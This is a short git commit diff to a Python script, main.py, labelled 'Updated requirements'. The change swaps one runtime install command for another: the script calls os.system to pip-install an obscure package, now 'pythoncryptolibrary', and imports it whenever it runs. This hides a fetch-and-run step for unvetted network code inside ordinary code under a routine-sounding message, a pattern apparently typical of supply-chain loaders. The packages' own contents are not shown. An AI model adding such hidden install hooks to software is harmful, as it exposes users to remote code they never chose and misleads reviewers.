e5fb1c84904a25d509829e4901ae442f347b69c8
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 05:16:43 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolorpkgV1")
-import pipcolorpkgV1
+os.system("pip install pythoncryptolibrary")
+import pythoncryptolibrary
 import json
 import httpx
 import time
